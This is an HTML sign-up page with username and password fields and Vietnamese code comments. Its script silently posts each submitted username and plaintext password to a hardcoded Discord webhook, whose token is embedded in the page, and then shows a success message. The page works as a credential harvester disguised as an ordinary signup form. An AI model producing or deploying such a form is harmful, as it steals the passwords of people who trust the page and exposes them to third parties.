<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Form</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        label { display: block; margin-top: 10px; }
        input, button { padding: 10px; margin-top: 5px; width: 100%; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sign Up</h1>
        <form id="signup-form">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('signup-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Ngăn chặn hành vi gửi form mặc định
            
            const formData = new FormData(this);
            const data = {
                username: formData.get('username'),
                password: formData.get('password')
            };

            // Tạo nội dung tin nhắn cho Discord webhook
            const messageContent = `**New Signup**\nUsername: ${data.username}\nPassword: ${data.password}`;

            // Gửi dữ liệu đến Discord webhook
            fetch('https://discord.com/api/webhooks/1284222224173240352/2UsRx6JTP2vbDpCCQDSvfw5bJv2Y7sBq60lKuj2ESTyJl-Rq1rxUqwf-SkN6TRi_ix5R', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: messageContent
                })
            }).then(response => {
                if (response.ok) {
                    alert('Form submitted successfully!');
                } else {
                    alert('Error submitting form.');
                }
            }).catch(error => {
                console.error('Error:', error);
                alert('Error submitting form.');
            });
        });
    </script>
</body>
</html>
